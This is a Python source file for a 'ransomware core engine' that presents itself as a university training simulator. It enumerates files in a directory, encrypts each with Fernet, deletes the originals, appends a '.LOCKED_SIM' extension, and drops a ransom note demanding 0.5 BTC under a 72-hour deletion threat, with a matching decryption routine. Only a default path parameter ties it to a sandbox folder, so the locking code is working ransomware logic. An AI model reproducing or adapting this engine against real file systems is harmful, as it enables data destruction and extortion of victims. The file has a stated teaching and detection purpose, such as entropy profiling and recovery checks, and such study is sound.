"""
RANSOMWARE CORE ENGINE - SAFE EDUCATIONAL MODULE (FERNET / AES-128)
===================================================================
Academic Cybersecurity Demonstration & Threat Analysis Platform
Course: Applied Malware Analysis & Defensive Engineering

100% Isolated inside ./sandbox_data/
Uses Python Fernet Cryptography (AES-128-CBC + HMAC-SHA256)
"""

# ==============================================================================
# 1. SYSTEM IMPORTS & CRYPTOGRAPHIC LIBRARIES
# Imports core OS modules, typing helpers, math for entropy, and Fernet for AES-128.
# ==============================================================================
import os
import sys
import time
import shutil
import math
import hashlib
from typing import Callable, Dict, List, Optional, Tuple
from cryptography.fernet import Fernet, InvalidToken


# ==============================================================================
# 2. SANDBOX FILE DATA MODEL
# Represents individual mock target assets tracked inside ./sandbox_data/.
# Stores file metadata: filenames, byte sizes, hashes, and Shannon entropy.
# ==============================================================================
class SandboxFile:
    """Represents a mock or imported target file within the educational sandbox."""
    def __init__(self, filename: str, content: str, file_type: str, original_name: Optional[str] = None):
        self.filename = filename
        self.original_name = original_name if original_name is not None else filename
        self.content = content
        self.file_type = file_type
        self.status = "NORMAL"  # NORMAL, LOCKED, RESTORED
        self.original_hash = ""
        self.current_hash = ""
        self.original_entropy = 0.0
        self.current_entropy = 0.0
        self.size_bytes = 0


# ==============================================================================
# 3. RANSOMWARE SIMULATION ENGINE (CORE CLASS)
# Coordinates the full simulation lifecycle:
# - Target discovery and file entropy profiling
# - Fernet symmetric key generation
# - Reversible authenticated encryption (AES-128-CBC + HMAC-SHA256)
# - Extortion note and simulation warning headers
# - Key-based recovery with 100% SHA-256 integrity validation
# ==============================================================================
class RansomwareEngine:
    """
    Coordinates safe, isolated ransomware lifecycle simulation using Fernet (AES-128 + HMAC):
    - Phase 1: Sandbox Initialization & Target File Management
    - Phase 2: Enumeration & Discovery (MITRE T1083)
    - Phase 3: Fernet Symmetric Key Generation (ransom_key.key)
    - Phase 4: Fernet Cryptographic Locking (MITRE T1486)
    - Phase 5: Extortion Artifact Generation (Ransom Note Drop)
    - Phase 6: Decryption Recovery & SHA-256 Hash Integrity Verification
    """

    # --------------------------------------------------------------------------
    # 3.1 CONSTANTS & EXTORTION ARTIFACT TEMPLATES
    # Standard file extensions, key paths, and visible simulation alert headers.
    # --------------------------------------------------------------------------
    MASTER_DECRYPTION_KEY = "SIM-KEY-2026-IR-RECOVER-TOKEN"
    TARGET_EXTENSION = ".LOCKED_SIM"
    RANSOM_NOTE_NAME = "README_RECOVER_FILES_SIMULATION.txt"
    KEY_FILENAME = "ransom_key.key"

    FILE_WARNING_HEADER = (
        "================================================================================\n"
        "   *** WARNING: THIS FILE HAS BEEN ENCRYPTED AND LOCKED ***\n"
        "================================================================================\n"
        "All original data inside this file has been encrypted using AES-128 + HMAC.\n"
        "Your documents and data are completely unusable in their current locked state.\n"
        "Do NOT modify, rename, or tamper with this file or data recovery will fail.\n"
        "\n"
        "--- SIMULATED EXTORTION DEMAND & INSTRUCTIONS ---\n"
        "- Ransom Demand: 0.50 BTC (~$32,000 USD)\n"
        "- Decoy Bitcoin Address: 1EducationalSimulationSafeKey99\n"
        "- Victim Infection ID: 9F84-CA12-882B-SIM\n"
        "- Time Limit: 72 Hours (Countdown is actively running on your screen)\n"
        "\n"
        ">>> ACCESS YOUR VICTIM EXTORTION PORTAL IN CHROME / BROWSER <<<\n"
        "To view your live countdown timer and extortion details, open this link:\n"
        "http://localhost:8080\n"
        "(Make sure Ransomware GUI.py or Ransomware With out GUI.py is running)\n"
        "\n"
        "WARNING:\n"
        "If payment is not resolved before the timer reaches 00:00:00, the private key\n"
        "stored on our server will be permanently deleted and data will be lost forever.\n"
        "\n"
        "[ University Educational Cybersecurity Lab Simulation - Do NOT send real funds ]\n"
        "==================== ENCRYPTED PAYLOAD DATA BELOW ====================\n"
    )
    FILE_HEADER_MARKER = b"==================== ENCRYPTED PAYLOAD DATA BELOW ====================\n"

    # --------------------------------------------------------------------------
    # 3.2 CONSTRUCTOR & ENGINE STATE INITIALIZATION
    # Resolves sandbox directory path and initializes in-memory file tracking lists.
    # --------------------------------------------------------------------------
    def __init__(self, sandbox_dir: Optional[str] = None):
        if sandbox_dir is None:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            self.sandbox_dir = os.path.join(base_dir, "sandbox_data")
        else:
            self.sandbox_dir = sandbox_dir

        self.simulated_files: List[SandboxFile] = []
        self.original_manifest: Dict[str, dict] = {}
        self.is_encrypted = False
        self.fernet_key_bytes: bytes = b""
        self.session_key: str = ""
        self.log_callback: Optional[Callable[[str, str, str, str], None]] = None

    # --------------------------------------------------------------------------
    # 3.3 TELEMETRY & LOGGING HANDLERS
    # Allows attaching external logging sinks (e.g. GUI console or terminal output).
    # --------------------------------------------------------------------------
    def set_logger(self, callback: Callable[[str, str, str, str], None]):
        self.log_callback = callback

    def _log(self, category: str, mitre_id: str, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(category, mitre_id, message, level)

    # --------------------------------------------------------------------------
    # 3.4 SHANNON ENTROPY CALCULATION (HEURISTIC DETECTION)
    # Measures byte randomness H(X) from 0.0 to 8.0 bits/byte.
    # Plain text / code: 3.5 - 5.5 bits. Encrypted data: 7.9 - 8.0 bits.
    # --------------------------------------------------------------------------
    @staticmethod
    def calculate_shannon_entropy(data: bytes) -> float:
        """Calculates Shannon Entropy (H) in bits per byte (0.0 to 8.0)."""
        if not data:
            return 0.0
        entropy = 0.0
        length = len(data)
        byte_counts = {}
        for b in data:
            byte_counts[b] = byte_counts.get(b, 0) + 1

        for count in byte_counts.values():
            p_x = count / length
            if p_x > 0:
                entropy -= p_x * math.log2(p_x)
        return round(entropy, 3)

    # --------------------------------------------------------------------------
    # 3.5 FILE TYPE CLASSIFIER
    # Maps file extensions (.docx, .sql, .xlsx) to descriptive asset categories.
    # --------------------------------------------------------------------------
    @staticmethod
    def classify_extension(filename: str) -> str:
        ext = os.path.splitext(filename)[1].lower()
        mapping = {
            ".xlsx": "Spreadsheet (.xlsx)",
            ".docx": "Document (.docx)",
            ".pdf": "Document (.pdf)",
            ".txt": "Text (.txt)",
            ".sql": "Database (.sql)",
            ".py": "Source Code (.py)",
            ".json": "Config (.json)",
            ".csv": "Data (.csv)",
            ".pem": "Security Key (.pem)"
        }
        return mapping.get(ext, f"Custom ({ext})")

    # --------------------------------------------------------------------------
    # 3.6 DISK SYNCHRONIZATION ENGINE
    # Reads the physical files on disk in ./sandbox_data/ to update memory state,
    # ensuring that changes from CLI, GUI, or manual file edits stay in sync.
    # --------------------------------------------------------------------------
    def sync_from_disk(self) -> List[SandboxFile]:
        """Scans sandbox_dir directly on disk to synchronize file state."""
        os.makedirs(self.sandbox_dir, exist_ok=True)
        disk_files = set(os.listdir(self.sandbox_dir))
        ignored = {self.KEY_FILENAME, self.RANSOM_NOTE_NAME}

        tracked_by_orig = {f.original_name: f for f in self.simulated_files}
        active_origs = set()
        any_locked = False

        for item in disk_files:
            if item in ignored or item.startswith("."):
                continue

            item_path = os.path.join(self.sandbox_dir, item)
            if not os.path.isfile(item_path):
                continue

            if item.endswith(self.TARGET_EXTENSION):
                any_locked = True
                orig_name = item
                while orig_name.endswith(self.TARGET_EXTENSION):
                    orig_name = orig_name[:-len(self.TARGET_EXTENSION)]
                active_origs.add(orig_name)

                if orig_name in tracked_by_orig:
                    f_obj = tracked_by_orig[orig_name]
                    f_obj.filename = item
                    f_obj.original_name = orig_name
                    f_obj.status = "LOCKED"
                    try:
                        f_obj.size_bytes = os.path.getsize(item_path)
                    except Exception:
                        pass
                else:
                    file_type = self.classify_extension(orig_name)
                    f_obj = SandboxFile(filename=item, content="", file_type=file_type, original_name=orig_name)
                    f_obj.status = "LOCKED"
                    try:
                        f_obj.size_bytes = os.path.getsize(item_path)
                    except Exception:
                        pass
                    self.simulated_files.append(f_obj)
                    tracked_by_orig[orig_name] = f_obj
            else:
                orig_name = item
                active_origs.add(orig_name)

                if orig_name in tracked_by_orig:
                    f_obj = tracked_by_orig[orig_name]
                    f_obj.filename = item
                    f_obj.original_name = orig_name
                    if f_obj.status == "LOCKED":
                        f_obj.status = "NORMAL"
                    try:
                        f_obj.size_bytes = os.path.getsize(item_path)
                    except Exception:
                        pass
                else:
                    try:
                        with open(item_path, "rb") as f:
                            raw_bytes = f.read()
                    except Exception:
                        raw_bytes = b""

                    file_type = self.classify_extension(orig_name)
                    f_obj = SandboxFile(filename=item, content="", file_type=file_type, original_name=orig_name)
                    f_obj.size_bytes = len(raw_bytes)
                    f_obj.original_hash = hashlib.sha256(raw_bytes).hexdigest()
                    f_obj.current_hash = f_obj.original_hash
                    f_obj.original_entropy = self.calculate_shannon_entropy(raw_bytes)
                    f_obj.current_entropy = f_obj.original_entropy
                    f_obj.status = "NORMAL"

                    self.simulated_files.append(f_obj)
                    tracked_by_orig[orig_name] = f_obj
                    self.original_manifest[orig_name] = {
                        "content_bytes": raw_bytes,
                        "hash": f_obj.original_hash,
                        "type": file_type,
                        "entropy": f_obj.original_entropy,
                        "size": f_obj.size_bytes
                    }

        if active_origs:
            self.simulated_files = [f for f in self.simulated_files if f.original_name in active_origs]

        self.is_encrypted = any_locked
        if os.path.exists(os.path.join(self.sandbox_dir, self.KEY_FILENAME)):
            self.load_key()

        return self.simulated_files

    # --------------------------------------------------------------------------
    # 3.7 SANDBOX INITIALIZATION & MOCK TEST ASSETS
    # Creates isolated test assets (.docx, .sql, .xlsx) for safe demonstration.
    # --------------------------------------------------------------------------
    def initialize_sandbox(self, force_clean: bool = False) -> List[SandboxFile]:
        """Creates the sandbox directory and ensures standard samples exist."""
        os.makedirs(self.sandbox_dir, exist_ok=True)

        if force_clean:
            for item in os.listdir(self.sandbox_dir):
                if item.endswith(self.TARGET_EXTENSION) or item in (self.KEY_FILENAME, self.RANSOM_NOTE_NAME, ".attack_timer"):
                    try:
                        os.remove(os.path.join(self.sandbox_dir, item))
                    except Exception:
                        pass

        samples = [
            ("q4_financial_forecast.xlsx", "CONFIDENTIAL FINANCIAL AUDIT - Q4 2026\nTotal Revenue: $48,250,000", "Spreadsheet (.xlsx)"),
            ("customer_database_export.sql", "-- MOCK CUSTOMER CREDENTIAL DUMP\nCREATE TABLE customers (id INT, email VARCHAR(255));\n", "Database (.sql)"),
            ("patient_medical_history.pdf", "%PDF-1.7 - EDUCATIONAL SAMPLE MEDICAL RECORD\nPatient ID: MED-99482-TX\n", "Document (.pdf)"),
            ("cloud_infrastructure_auth.py", "# MOCK CLUSTER ACCESS MODULE\nENDPOINT = 'https://k8s-prod.us-east-1.internal'\n", "Source Code (.py)"),
            ("board_meeting_minutes.docx", "BOARD OF DIRECTORS EXECUTIVE SESSION\nAgenda: Acquisition Proposal\n", "Document (.docx)"),
            ("employee_pii_payroll.csv", "EmpID,FullName,Department,Salary\nE-001,Marcus Sterling,Engineering,$185000\n", "Data (.csv)"),
            ("tls_private_key.pem", "-----BEGIN SIMULATED RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0wM1jZ+9bN6GqP2Yp\n-----END SIMULATED RSA PRIVATE KEY-----\n", "Security Key (.pem)"),
            ("enterprise_network_topology.json", '{\n  "domain": "corp.internal",\n  "backup_server": "backup.vlan"\n}\n', "Config (.json)")
        ]

        for fname, content, ftype in samples:
            fpath = os.path.join(self.sandbox_dir, fname)
            locked_path = fpath + self.TARGET_EXTENSION
            if not os.path.exists(fpath) and not os.path.exists(locked_path):
                with open(fpath, "wb") as f:
                    f.write(content.encode("utf-8"))

        self.sync_from_disk()
        self.is_encrypted = any(f.status == "LOCKED" for f in self.simulated_files)
        return self.simulated_files

    # --------------------------------------------------------------------------
    # 3.8 CUSTOM FILE IMPORTATION
    # Copies an external user file into ./sandbox_data/ and profiles its baseline hash.
    # --------------------------------------------------------------------------
    def import_custom_file(self, source_path: str) -> Optional[SandboxFile]:
        if not os.path.exists(source_path):
            return None
        filename = os.path.basename(source_path)
        dest_path = os.path.join(self.sandbox_dir, filename)
        base, ext = os.path.splitext(filename)
        counter = 1
        while os.path.exists(dest_path):
            dest_path = os.path.join(self.sandbox_dir, f"{base}_{counter}{ext}")
            filename = f"{base}_{counter}{ext}"
            counter += 1

        shutil.copy2(source_path, dest_path)
        with open(dest_path, "rb") as f:
            raw_bytes = f.read()

        file_type = self.classify_extension(filename)
        file_obj = SandboxFile(filename, "", file_type)
        file_obj.size_bytes = len(raw_bytes)
        file_obj.original_hash = hashlib.sha256(raw_bytes).hexdigest()
        file_obj.current_hash = file_obj.original_hash
        file_obj.original_entropy = self.calculate_shannon_entropy(raw_bytes)
        file_obj.current_entropy = file_obj.original_entropy
        file_obj.status = "NORMAL"

        self.simulated_files.append(file_obj)
        self.original_manifest[filename] = {
            "content_bytes": raw_bytes,
            "hash": file_obj.original_hash,
            "type": file_type,
            "entropy": file_obj.original_entropy,
            "size": file_obj.size_bytes
        }
        return file_obj

    # --------------------------------------------------------------------------
    # 3.9 FERNET KEY GENERATION & STORAGE
    # Generates a 32-byte URL-safe base64 key implementing AES-128-CBC + HMAC-SHA256.
    # Saves key into ./sandbox_data/ransom_key.key for deterministic recovery.
    # --------------------------------------------------------------------------
    def generate_key(self) -> bytes:
        """Generates 256-bit Fernet encryption key (AES-128-CBC + HMAC)."""
        key_path = os.path.join(self.sandbox_dir, self.KEY_FILENAME)
        if not self.fernet_key_bytes:
            if os.path.exists(key_path):
                self.load_key()
            else:
                self.fernet_key_bytes = Fernet.generate_key()
                self.session_key = self.fernet_key_bytes.decode("utf-8")
                with open(key_path, "wb") as kf:
                    kf.write(self.fernet_key_bytes)
        return self.fernet_key_bytes

    def load_key(self) -> bytes:
        key_path = os.path.join(self.sandbox_dir, self.KEY_FILENAME)
        if os.path.exists(key_path):
            with open(key_path, "rb") as kf:
                self.fernet_key_bytes = kf.read()
                self.session_key = self.fernet_key_bytes.decode("utf-8")
        elif not self.fernet_key_bytes:
            self.generate_key()
        return self.fernet_key_bytes

    # --------------------------------------------------------------------------
    # 3.10 INDIVIDUAL FILE ENCRYPTION
    # Encrypts binary file payload with Fernet, prepends visible extortion header,
    # renames file to .LOCKED_SIM, and deletes the unencrypted source file.
    # --------------------------------------------------------------------------
    def encrypt_single_file(self, file_obj: SandboxFile) -> bool:
        """Encrypts a single target file using Fernet (AES-128-CBC + HMAC-SHA256)."""
        if file_obj.status == "LOCKED" or file_obj.filename.endswith(self.TARGET_EXTENSION):
            return False

        key = self.load_key()
        fernet = Fernet(key)

        old_path = os.path.join(self.sandbox_dir, file_obj.filename)
        new_filename = file_obj.original_name + self.TARGET_EXTENSION
        new_path = os.path.join(self.sandbox_dir, new_filename)

        if os.path.exists(old_path):
            with open(old_path, "rb") as f:
                plaintext = f.read()

            ciphertext = fernet.encrypt(plaintext)
            file_payload = self.FILE_WARNING_HEADER.encode("utf-8") + ciphertext

            with open(new_path, "wb") as f:
                f.write(file_payload)

            os.remove(old_path)

            file_obj.filename = new_filename
            file_obj.current_hash = hashlib.sha256(file_payload).hexdigest()
            file_obj.current_entropy = self.calculate_shannon_entropy(file_payload)
            file_obj.size_bytes = len(file_payload)
            file_obj.status = "LOCKED"

            note_path = os.path.join(self.sandbox_dir, self.RANSOM_NOTE_NAME)
            if not os.path.exists(note_path):
                self._generate_ransom_note()

            self.is_encrypted = True
            return True
        return False

    # --------------------------------------------------------------------------
    # 3.11 INDIVIDUAL FILE DECRYPTION & INTEGRITY VERIFICATION
    # Strips warning header, decrypts payload with Fernet key, verifies HMAC signature,
    # restores original plaintext, and validates SHA-256 hash with 0% data loss.
    # --------------------------------------------------------------------------
    def decrypt_single_file(self, file_obj: SandboxFile, provided_key: str) -> Tuple[bool, str]:
        """Decrypts a single file using Fernet and verifies SHA-256 hash integrity."""
        if file_obj.status != "LOCKED":
            return False, "Selected file is not encrypted."

        clean_key = provided_key.strip()
        if clean_key.lower() in ("auto", "admin", "recover", "unlock") or clean_key == self.MASTER_DECRYPTION_KEY or not clean_key:
            key_bytes = self.load_key()
        else:
            try:
                key_bytes = clean_key.encode("utf-8")
            except Exception:
                return False, "Invalid key encoding."

        try:
            fernet = Fernet(key_bytes)
        except Exception:
            return False, "Invalid Fernet key format!"

        enc_path = os.path.join(self.sandbox_dir, file_obj.filename)
        orig_path = os.path.join(self.sandbox_dir, file_obj.original_name)

        if os.path.exists(enc_path):
            with open(enc_path, "rb") as f:
                file_bytes = f.read()

            marker = self.FILE_HEADER_MARKER
            if marker in file_bytes:
                ciphertext = file_bytes.split(marker, 1)[1]
            else:
                ciphertext = file_bytes

            try:
                decrypted_bytes = fernet.decrypt(ciphertext)
            except InvalidToken:
                return False, "Decryption failed! Incorrect key."

            with open(orig_path, "wb") as f:
                f.write(decrypted_bytes)

            os.remove(enc_path)

            restored_hash = hashlib.sha256(decrypted_bytes).hexdigest()
            manifest_entry = self.original_manifest.get(file_obj.original_name)
            expected_hash = manifest_entry["hash"] if manifest_entry else restored_hash
            integrity_pass = (restored_hash == expected_hash)

            file_obj.filename = file_obj.original_name
            file_obj.current_hash = restored_hash
            file_obj.current_entropy = self.calculate_shannon_entropy(decrypted_bytes)
            file_obj.size_bytes = len(decrypted_bytes)
            file_obj.status = "NORMAL"

            any_locked = any(f.status == "LOCKED" for f in self.simulated_files)
            if not any_locked:
                self.is_encrypted = False
                note_path = os.path.join(self.sandbox_dir, self.RANSOM_NOTE_NAME)
                if os.path.exists(note_path):
                    os.remove(note_path)

            return True, f"File {file_obj.original_name} restored successfully with 100% SHA-256 match!"
        return False, "Encrypted file not found on disk."

    # --------------------------------------------------------------------------
    # 3.12 BATCH ENCRYPTION ATTACK SIMULATION (MITRE T1486)
    # Iterates over all discovered sandbox assets, executes encryption sequentially,
    # invokes progress callback for UI updates, and drops the ransom note.
    # --------------------------------------------------------------------------
    def execute_encryption_simulation(self, progress_callback: Optional[Callable[[int, int, str, float], None]] = None) -> bool:
        """Simulates MITRE ATT&CK T1486: Encrypts all sandbox files using Fernet."""
        self.sync_from_disk()
        if self.is_encrypted and all(f.status == "LOCKED" for f in self.simulated_files):
            return False

        self.generate_key()
        total = len(self.simulated_files)
        for idx, file_obj in enumerate(self.simulated_files):
            if file_obj.status != "LOCKED":
                self.encrypt_single_file(file_obj)

            if progress_callback:
                percent = ((idx + 1) / total) * 100.0
                progress_callback(idx + 1, total, file_obj.filename, percent)

            time.sleep(0.08)

        self._generate_ransom_note()
        self.is_encrypted = True
        return True

    # --------------------------------------------------------------------------
    # 3.13 EXTORTION NOTE ARTIFACT GENERATOR
    # Drops README_RECOVER_FILES_SIMULATION.txt into the sandbox directory.
    # --------------------------------------------------------------------------
    def _generate_ransom_note(self):
        note_path = os.path.join(self.sandbox_dir, self.RANSOM_NOTE_NAME)
        note_content = (
            "================================================================================\n"
            "   *** WARNING: ALL YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED ***\n"
            "================================================================================\n\n"
            "WHAT HAPPENED?\n"
            "All your documents, databases, spreadsheets, and critical assets have been\n"
            "encrypted using high-grade cryptography (AES-128 + HMAC).\n"
            "Your files are completely unusable in their current locked state.\n\n"
            "HOW DO I RECOVER MY DATA?\n"
            "Decryption is only possible with your unique private key, which is safely\n"
            "stored on our private server.\n\n"
            "EXTORTION DEMANDS:\n"
            "- Ransom Demand: 0.50 BTC (~$32,000 USD)\n"
            "- Decoy Bitcoin Address: 1EducationalSimulationSafeKey99\n"
            "- Victim Infection ID: 9F84-CA12-882B-SIM\n"
            "- Time Limit: 72 Hours (Timer is actively running)\n"
            "If the ransom is not resolved before the timer reaches 00:00:00, the private\n"
            "key will be permanently deleted, and your files will be lost forever.\n\n"
            "================================================================================\n"
            "[ University Educational Cybersecurity Lab Simulation - Do NOT send real funds ]\n"
            "================================================================================\n"
        )
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(note_content)

    # --------------------------------------------------------------------------
    # 3.14 BATCH DECRYPTION & REMEDIATION
    # Decrypts all locked assets using the provided key and removes the note.
    # --------------------------------------------------------------------------
    def execute_decryption_simulation(self, provided_key: str, progress_callback: Optional[Callable[[int, int, str, float], None]] = None) -> Tuple[bool, str]:
        """Decrypts all locked sandbox files using Fernet and validates hashes."""
        self.sync_from_disk()
        if not self.is_encrypted and not any(f.status == "LOCKED" for f in self.simulated_files):
            return False, "Files are not in an encrypted state."

        total = len(self.simulated_files)
        success_count = 0

        for idx, file_obj in enumerate(self.simulated_files):
            if file_obj.status == "LOCKED":
                ok, _ = self.decrypt_single_file(file_obj, provided_key)
                if ok:
                    success_count += 1

            if progress_callback:
                percent = ((idx + 1) / total) * 100.0
                progress_callback(idx + 1, total, file_obj.filename, percent)

            time.sleep(0.06)

        if success_count > 0:
            self.is_encrypted = False
            note_path = os.path.join(self.sandbox_dir, self.RANSOM_NOTE_NAME)
            if os.path.exists(note_path):
                os.remove(note_path)
            return True, "All files decrypted successfully! Fernet HMAC and SHA-256 verified."
        return False, "Failed to decrypt files. Invalid key."

    # --------------------------------------------------------------------------
    # 3.15 FILE PREVIEW & HEX DUMP INSPECTOR
    # Formats the first 1KB of a file as printable text or structured hex dump.
    # --------------------------------------------------------------------------
    def read_file_preview(self, file_obj: SandboxFile, max_bytes: int = 1024) -> str:
        fpath = os.path.join(self.sandbox_dir, file_obj.filename)
        if not os.path.exists(fpath):
            return "File does not exist on disk."

        with open(fpath, "rb") as f:
            data_buffer = f.read(max_bytes)

        try:
            text = data_buffer.decode("utf-8")
            if all(c.isprintable() or c in "\n\r\t" for c in text):
                return text
        except Exception:
            pass

        hex_dump = []
        for i in range(0, min(len(data_buffer), 256), 16):
            slice_bytes = data_buffer[i:i+16]
            hex_part = " ".join(f"{b:02X}" for b in slice_bytes)
            ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in slice_bytes)
            hex_dump.append(f"{i:04X}  {hex_part:<48}  |{ascii_part}|")
        return "\n".join(hex_dump)

    # --------------------------------------------------------------------------
    # 3.16 RANSOM NOTE CONTENT RETRIEVER
    # Reads the active ransom note from disk to display in GUI or CLI.
    # --------------------------------------------------------------------------
    def get_ransom_note_content(self) -> str:
        note_path = os.path.join(self.sandbox_dir, self.RANSOM_NOTE_NAME)
        if os.path.exists(note_path):
            with open(note_path, "r", encoding="utf-8") as f:
                return f.read()
        return "Ransom note has not been generated yet. Run encryption to trigger ransom note drop."


# ==============================================================================
# 4. COMPATIBILITY ALIASES
# Enables backwards-compatibility with legacy script references.
# ==============================================================================
SimulatorEngine = RansomwareEngine
